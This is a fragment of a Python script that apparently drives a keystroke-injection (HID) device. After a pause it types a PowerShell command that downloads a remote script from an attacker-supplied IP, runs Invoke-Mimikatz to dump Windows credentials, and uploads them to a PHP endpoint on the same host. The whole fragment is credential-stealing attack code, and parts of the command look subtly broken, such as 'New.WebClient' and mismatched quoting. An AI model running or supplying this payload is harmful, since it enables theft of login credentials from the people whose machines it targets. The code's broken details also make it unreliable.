...
if __name__ == "__main__":
    ...
    time.sleep(5.0)
    HID.type_string('powershell \"IEX (New-Object New.WebClient).DownloadString(\'http://{}/im.ps1\'); $output = Invoke-Mimikatz -DumpCreds; (New-Object Net.WebClient).UploadString(\'http://{}/rx.php\', $output\")\n'.format(args.ip, args.ip))
